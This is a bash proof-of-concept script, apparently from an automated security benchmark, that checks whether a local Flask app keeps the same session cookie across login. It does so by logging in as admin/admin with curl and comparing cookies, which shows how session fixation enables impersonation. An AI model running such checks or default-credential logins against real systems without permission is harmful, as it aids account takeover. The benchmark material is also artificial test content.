#!/bin/bash
# POC: Session Fixation Vulnerability POC - Demonstrates that Flask does not regenerate session IDs after successful authentication. The same session cookie persists before and after login, allowing an attacker to force a user to authenticate with a known session ID.
# Target: ./repo
# Created: 2025-12-01T15:46:33.303Z
# Session: benchmark-XBEN-089-24-minbd498

# Session Fixation Vulnerability POC
# Demonstrates that Flask doesn't regenerate session IDs after authentication
# The vulnerability allows an attacker to:
# 1. Create/obtain a session ID
# 2. Force a user to login with that session ID
# 3. Impersonate the user since they share the same session

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_JAR="/tmp/session_cookies_$$.txt"
OUTPUT_FILE="/tmp/session_fixation_poc_$$.txt"

echo "=== Session Fixation Vulnerability POC ===" | tee "$OUTPUT_FILE"
echo "Target: $TARGET_URL" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Step 1: Make initial request to create a session (pre-login)
echo "[*] Step 1: Creating initial session (before login)..." | tee -a "$OUTPUT_FILE"
INITIAL_RESPONSE=$(curl -s -c "$COOKIE_JAR" "$TARGET_URL/" 2>&1)
echo "[+] Initial request completed" | tee -a "$OUTPUT_FILE"

# Extract the session cookie before login
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Step 2: Extracting session cookie from cookie jar..." | tee -a "$OUTPUT_FILE"
if [ -f "$COOKIE_JAR" ]; then
    PRE_LOGIN_COOKIE=$(grep -oP '(?<=session\t)[^\t]*$' "$COOKIE_JAR" | head -1)
    if [ -n "$PRE_LOGIN_COOKIE" ]; then
        echo "[+] Pre-login session cookie obtained:" | tee -a "$OUTPUT_FILE"
        echo "    ${PRE_LOGIN_COOKIE:0:50}..." | tee -a "$OUTPUT_FILE"
    else
        echo "[-] No session cookie found in initial request" | tee -a "$OUTPUT_FILE"
    fi
fi

# Step 2: Attempt login while keeping the same session
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Step 3: Attempting login with same session cookie..." | tee -a "$OUTPUT_FILE"

# Try login with credentials
LOGIN_RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin"}' 2>&1)

echo "[+] Login response: $LOGIN_RESPONSE" | tee -a "$OUTPUT_FILE"

# Step 3: Extract session cookie after login
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Step 4: Extracting session cookie after login..." | tee -a "$OUTPUT_FILE"
POST_LOGIN_COOKIE=$(grep -oP '(?<=session\t)[^\t]*$' "$COOKIE_JAR" | head -1)
if [ -n "$POST_LOGIN_COOKIE" ]; then
    echo "[+] Post-login session cookie obtained:" | tee -a "$OUTPUT_FILE"
    echo "    ${POST_LOGIN_COOKIE:0:50}..." | tee -a "$OUTPUT_FILE"
else
    echo "[-] No session cookie found after login" | tee -a "$OUTPUT_FILE"
fi

# Step 4: Compare session cookies
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Step 5: Comparing session cookies..." | tee -a "$OUTPUT_FILE"
if [ "$PRE_LOGIN_COOKIE" = "$POST_LOGIN_COOKIE" ]; then
    echo "[VULNERABLE] Session ID did NOT change after authentication!" | tee -a "$OUTPUT_FILE"
    echo "[VULNERABLE] Pre-login session:  ${PRE_LOGIN_COOKIE:0:50}..." | tee -a "$OUTPUT_FILE"
    echo "[VULNERABLE] Post-login session: ${POST_LOGIN_COOKIE:0:50}..." | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "=== VULNERABILITY CONFIRMED ===" | tee -a "$OUTPUT_FILE"
    echo "The application reuses the same session ID across authentication boundaries." | tee -a "$OUTPUT_FILE"
    echo "This enables session fixation attacks where an attacker can:" | tee -a "$OUTPUT_FILE"
    echo "1. Pre-generate a session ID" | tee -a "$OUTPUT_FILE"
    echo "2. Trick a user into logging in with that session ID" | tee -a "$OUTPUT_FILE"
    echo "3. Impersonate the user by using the same authenticated session" | tee -a "$OUTPUT_FILE"
    VULN_STATUS="VULNERABLE"
else
    if [ -z "$PRE_LOGIN_COOKIE" ] || [ -z "$POST_LOGIN_COOKIE" ]; then
        echo "[?] Unable to extract session cookies - server may not be setting session cookies" | tee -a "$OUTPUT_FILE"
        VULN_STATUS="INCONCLUSIVE"
    else
        echo "[SECURE] Session ID changed after authentication (as expected)" | tee -a "$OUTPUT_FILE"
        VULN_STATUS="SECURE"
    fi
fi

# Step 5: Verify authenticated access with the session
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Step 6: Verifying authenticated session access..." | tee -a "$OUTPUT_FILE"
AUTH_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/emp/dashboard" 2>&1)
if echo "$AUTH_RESPONSE" | grep -qi "dashboard\|employee\|404"; then
    echo "[+] Authenticated session is active" | tee -a "$OUTPUT_FILE"
    echo "[+] Session cookie grants access to protected resources" | tee -a "$OUTPUT_FILE"
else
    echo "[*] Could not confirm protected resource access" | tee -a "$OUTPUT_FILE"
fi

# Cleanup
rm -f "$COOKIE_JAR"

echo "" | tee -a "$OUTPUT_FILE"
echo "=== POC Complete ===" | tee -a "$OUTPUT_FILE"
echo "Status: $VULN_STATUS" | tee -a "$OUTPUT_FILE"
echo "Full output saved to: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"

# Print the output
cat "$OUTPUT_FILE"

# Exit with appropriate code
if [ "$VULN_STATUS" = "VULNERABLE" ]; then
    exit 0
else
    exit 1
fi